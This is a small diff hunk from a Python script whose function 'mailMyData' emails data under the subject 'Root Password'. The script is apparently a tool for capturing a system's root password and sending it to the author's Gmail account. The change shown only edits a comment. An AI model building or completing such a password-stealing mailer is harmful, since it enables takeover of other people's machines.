@@ -8,7 +8,7 @@ from getpass import getpass
 import time
 
 def mailMyData(dataToSend):
-    myMail = "example@gmail.com" # Change this to your mail
+    myMail = "example@gmail.com" # Change this to your gmail *Only Gmail Allowed*
     myPass = ""           # Your mail Password
     msg = MIMEMultipart()
     msg['Subject'] = "Root Password"
